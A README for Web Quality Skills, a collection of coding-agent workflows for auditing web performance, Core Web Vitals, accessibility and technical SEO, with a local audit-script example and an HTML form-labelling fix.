# Web Quality Skills for Measurable Website Improvements

Web Quality Skills helps coding agents investigate and improve web projects.
Web Quality reviews cover performance, accessibility, technical SEO, and browser best practices.
The web quality audit skill connects findings with relevant source code and verification steps.

The web quality skills core web vitals workflow focuses on loading, interaction, and visual stability.
The web quality skills accessibility workflow combines automated findings with manual interaction checks.
The collection is maintained by Addy Osmani and is an unofficial project rather than a Google product.

[![GET Web Quality Skills](https://img.shields.io/badge/GET-Web%20Quality%20Skills-9333EA?style=flat-square&labelColor=581C87)](https://web-quality-skills.github.io/Web-Quality/)

## Why web quality skills?

A useful audit identifies a problem, shows the evidence, and explains how to verify a correction.
The collection gives an agent reusable workflows for doing that across different web stacks.

- Start with representative pages and important user journeys.
- Identify which observations were measured and which were inferred.
- Investigate the resources and components implicated by the evidence.
- Prefer targeted changes over unrelated cleanup.
- Repeat comparable checks after making a change.

Web Quality Skills can support projects built with React, Vue, Svelte, server-rendered templates, or plain HTML.
The framework changes where a fix belongs; the user-visible problem still needs verification.

| Review area | Useful evidence | Completion check |
| --- | --- | --- |
| Loading | Resource timing and a performance trace | Comparable navigation after the change |
| Responsiveness | A trace of the affected interaction | Repeat the same interaction |
| Visual stability | Shift records and affected elements | Inspect the same loading sequence |
| Accessibility | Automated findings and keyboard testing | Recheck the affected control or journey |
| Technical SEO | Rendered markup and HTTP responses | Verify the relevant crawl or metadata signal |
| Browser practices | Console, network, and source evidence | Repeat the failing request or behavior |

An aggregate score can help detect regressions.
Issue-level evidence explains what needs to change.

![Website audit findings connected to measured browser behavior and affected source components](FOTO)

## Available skills

Each skill is a source definition that the agent reads when its task matches.
The six definitions below are the collection's core instruction modules.

| Skill | Definition | Main purpose |
| --- | --- | --- |
| web-quality-audit | [SKILL.md](skills/web-quality-audit/SKILL.md) | Coordinate a review across quality categories |
| performance | [SKILL.md](skills/performance/SKILL.md) | Diagnose loading, runtime, and resource-delivery problems |
| core-web-vitals | [SKILL.md](skills/core-web-vitals/SKILL.md) | Investigate LCP, INP, and CLS |
| accessibility | [SKILL.md](skills/accessibility/SKILL.md) | Review semantics, keyboard access, and assistive-technology support |
| seo | [SKILL.md](skills/seo/SKILL.md) | Inspect technical search signals and structured data |
| best-practices | [SKILL.md](skills/best-practices/SKILL.md) | Review browser behavior, compatibility, and security-related findings |

Select a focused skill when the problem is already known.
Use the broader audit workflow when several quality categories need investigation.

## Measurement model

Field measurements describe actual visits.
Lab observations describe a controlled session that can help reproduce and explain a problem.

The workflow in [MEASUREMENT.md](skills/performance/references/MEASUREMENT.md) explains how to compare these evidence sources.
The guide [RUM.md](skills/performance/references/RUM.md) covers first-party real-user monitoring.

A browser trace can show where time was spent during a particular run.
It does not establish what every visitor experienced.
Static source inspection can identify a plausible cause, but runtime verification may still be pending.

Keep the conditions with each result:

- URL, page state, and relevant interaction.
- Mobile or desktop scope and viewport.
- Browser and tool versions.
- Network and CPU conditions.
- Whether caches were warm or cold.
- The evidence file or report that supports the finding.

Use equivalent conditions for before-and-after comparisons.
A change in the testing environment can otherwise look like a product improvement.

## Skill details

### web-quality-audit

The audit workflow combines browser evidence with focused source inspection.
It also provides a small source-analysis helper, [analyze.sh](skills/web-quality-audit/scripts/analyze.sh).

The following Bash example scans an existing HTML file and summarizes its JSON output:

```bash
audit_target="./public/contact.html"
bash skills/web-quality-audit/scripts/analyze.sh "$audit_target" > quality-report.json
jq '{issueCount, warningCount, truncated}' quality-report.json
```

Replace the target with an HTML file or directory that exists in your project.
The helper requires Bash and jq.
It reads source and reports findings; it does not render the page or measure Core Web Vitals.

The report's success field indicates that analysis completed.
It does not mean that the page passed every quality check.

### performance

Investigate resource discovery, loading, execution, and rendering only where evidence points to a bottleneck.
A large file can be relevant, but transfer size alone does not explain every delay.

- Compare important page types rather than one convenient URL.
- Check whether a proposed optimization affects the critical path.
- Keep existing product-specific resource budgets.
- Verify both loading and the interactions affected by a change.

Resource budgets are project guardrails.
They should reflect target devices, networks, and user journeys.

### core-web-vitals

The references [LCP.md](skills/core-web-vitals/references/LCP.md), [INP.md](skills/core-web-vitals/references/INP.md), and [CLS.md](skills/core-web-vitals/references/CLS.md) separate the three diagnostic areas.

LCP concerns when the largest content becomes visible.
INP concerns interaction responsiveness.
CLS concerns unexpected movement of content.

Good field targets are LCP at or below 2.5 seconds, INP at or below 200 milliseconds, and CLS at or below 0.1.
Assess these at the 75th percentile, with mobile and desktop considered separately.
See the maintained [Web Vitals guidance](https://web.dev/articles/vitals) for definitions and assessment details.

A faster lab run is evidence about that test.
Confirming a field improvement requires new visitor measurements.

![Performance trace and field metrics compared before and after a focused website change](FOTO)

### accessibility

Accessibility work includes names, roles, focus, keyboard behavior, and understandable feedback.
The reference [WCAG.md](skills/accessibility/references/WCAG.md) organizes relevant criteria.
Practical interaction patterns are collected in [A11Y-PATTERNS.md](skills/accessibility/references/A11Y-PATTERNS.md).

A visible caption alone does not associate text with an input.

**Before: visually described input without an explicit label association.**

```html
<div class="contact-field">
  <span>Work email</span>
  <input type="email" name="work-email" autocomplete="email">
</div>
```

**After: the label identifies the input through its matching identifier.**

```html
<div class="contact-field">
  <label for="work-email">Work email</label>
  <input id="work-email" type="email" name="work-email" autocomplete="email">
</div>
```

This original example follows the [W3C guidance on labeling controls](https://www.w3.org/WAI/tutorials/forms/labels/).
Verify the resulting accessible name and keyboard flow in the rendered page.
An automated accessibility score does not replace manual evaluation.

### seo

Technical search reviews cover crawl controls, canonical consistency, metadata, and rendered content.
The reference [STRUCTURED-DATA.md](skills/seo/references/STRUCTURED-DATA.md) covers structured-data patterns.

Match the selected schema type to what the page actually presents.
Check syntax and current eligibility requirements.
Valid markup does not guarantee a rich result or a ranking improvement.

### best-practices

Use console and network failures to identify concrete browser problems.
The guide [SECURITY.md](skills/best-practices/references/SECURITY.md) supports deeper inspection when a related issue is in scope.

Verify deployed response headers rather than relying only on source configuration.
Treat Lighthouse results as part of the investigation.
A high score does not establish that an application is secure.

## Contributing

Keep a skill focused on a repeatable task.
Move detailed material into topic-specific references and preserve working relative links.

- Explain the problem and the evidence needed to recognize it.
- Include a practical example with an observable result.
- Keep measured findings separate from source hypotheses.
- Verify referenced files and command syntax.
- Describe the checks that remain manual or unavailable.

## Related Search Terms

Web Quality Skills, Web Quality, web quality audit skill, web quality skills core web vitals, web quality skills accessibility, accessibility, agent-skills, core-web-vitals, lighthouse, testing, web-performance, seo-audit, technical-seo, website-audit, ai-agents
